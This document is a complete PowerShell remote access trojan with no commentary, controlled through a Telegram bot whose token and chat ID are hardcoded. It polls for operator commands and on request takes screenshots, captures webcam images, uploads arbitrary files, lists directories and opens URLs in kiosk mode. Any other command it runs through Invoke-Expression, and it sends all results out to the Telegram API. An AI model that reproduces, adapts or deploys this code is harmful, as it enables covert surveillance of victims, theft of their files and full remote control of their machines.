$t='8410594170:AAFuddBxMEgNqn1RZFe0VnSG3n8iIzzAVWs';$c='5948651753';$u='https://api.telegram.org/bot'+$t;$o=0;$firstRun=$true;Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;Add-Type -AssemblyName System.Net.Http;try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;using System.Threading;public class Webcam{[DllImport("avicap32.dll")]public static extern IntPtr capCreateCaptureWindow(string lpszWindowName,int dwStyle,int x,int y,int nWidth,int nHeight,IntPtr hwndParent,int nID);[DllImport("user32.dll")]public static extern bool SendMessage(IntPtr hWnd,int wMsg,int wParam,IntPtr lParam);[DllImport("user32.dll")]public static extern bool DestroyWindow(IntPtr hWnd);public static string Capture(){try{IntPtr hwnd=capCreateCaptureWindow("Webcam",0x40000000,0,0,640,480,IntPtr.Zero,0);if(hwnd==IntPtr.Zero){return null;}SendMessage(hwnd,0x40A,0,IntPtr.Zero);Thread.Sleep(1000);SendMessage(hwnd,0x432,0,IntPtr.Zero);string tempFile=System.IO.Path.GetTempFileName()+".bmp";IntPtr p=Marshal.StringToHGlobalAuto(tempFile);SendMessage(hwnd,0x41A,0,p);SendMessage(hwnd,0x40B,0,0);Marshal.FreeHGlobal(p);DestroyWindow(hwnd);if(!System.IO.File.Exists(tempFile)){return null;}return tempFile;}catch{return null;}}}' -Language CSharp}catch{};while($true){try{$r=Invoke-RestMethod ($u+'/getUpdates?offset='+$o);if($firstRun){Invoke-RestMethod -Uri ($u+'/sendMessage') -Method Post -Body @{chat_id=$c;text='CONNECTED /url google.com /ss /getfile "filepatch" IN DEV /ls /webcam'};$firstRun=$false};foreach($m in $r.result){$o=$m.update_id+1;$cmd=$m.message.text;$res='Unknown command';if([string]::IsNullOrEmpty($cmd)){$res='Empty command'}else{try{if($cmd -eq '/ss'){$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.X,$b.Y,0,0,$b.Size);$f=[System.IO.Path]::GetTempFileName()+'.png';$bmp.Save($f,[System.Drawing.Imaging.ImageFormat]::Png);$g.Dispose();$bmp.Dispose();if([System.IO.File]::Exists($f)){$form=New-Object System.Net.Http.MultipartFormDataContent;$fs=[System.IO.File]::OpenRead($f);$fc=New-Object System.Net.Http.StreamContent($fs);$form.Add($fc,'photo','screenshot.png');$client=New-Object System.Net.Http.HttpClient;$r=$client.PostAsync($u+'/sendPhoto?chat_id='+$c,$form).Result;$fs.Close();[System.IO.File]::Delete($f);$res='Screenshot sent'}else{$res='Error: failed to save screenshot'}}elseif($cmd -eq '/webcam'){$f=[Webcam]::Capture();if($f -eq $null -or ![System.IO.File]::Exists($f)){$res='Error: webcam not found or failed to save photo'}else{$form=New-Object System.Net.Http.MultipartFormDataContent;$fs=[System.IO.File]::OpenRead($f);$fc=New-Object System.Net.Http.StreamContent($fs);$form.Add($fc,'photo','webcam.bmp');$client=New-Object System.Net.Http.HttpClient;$r=$client.PostAsync($u+'/sendPhoto?chat_id='+$c,$form).Result;$fs.Close();[System.IO.File]::Delete($f);$res='Webcam photo sent'}}elseif($cmd -eq '/ls'){$res=Get-ChildItem | Select-Object Name | Out-String;if([string]::IsNullOrEmpty($res)){$res='No files or directories found'}}elseif($cmd -match '^/url\s+(.+)$'){$url=$matches[1].Trim();try{Start-Process "chrome.exe" -ArgumentList '--kiosk',$url;$res='URL "'+$url+'" opened in Chrome in kiosk mode'}catch{$res='Error opening URL "'+$url+'": '+$_.Exception.Message}}elseif($cmd -match '^/getfile\s+(.+)$'){$f=$matches[1].Trim();$f=$f -replace '"','';$f=$f -replace '/','\';if([System.IO.File]::Exists($f)){$form=New-Object System.Net.Http.MultipartFormDataContent;$fs=[System.IO.File]::OpenRead($f);$fc=New-Object System.Net.Http.StreamContent($fs);$form.Add($fc,'document',[System.IO.Path]::GetFileName($f));$client=New-Object System.Net.Http.HttpClient;$r=$client.PostAsync($u+'/sendDocument?chat_id='+$c,$form).Result;$fs.Close();$res='File sent'}else{$res='Error: file "'+$f+'" not found'}}else{$res=Invoke-Expression $cmd -ErrorAction SilentlyContinue|Out-String;if([string]::IsNullOrEmpty($res)){$res='Command executed, but no output'}}}catch{$res='Error: '+$_.Exception.Message}};if(-not [string]::IsNullOrEmpty($res)){Invoke-RestMethod -Uri ($u+'/sendMessage') -Method Post -Body @{chat_id=$c;text=$res}}}}catch{$res='API Error: '+$_.Exception.Message;if(-not [string]::IsNullOrEmpty($res)){Invoke-RestMethod -Uri ($u+'/sendMessage') -Method Post -Body @{chat_id=$c;text=$res}};Start-Sleep 5};Start-Sleep 3}
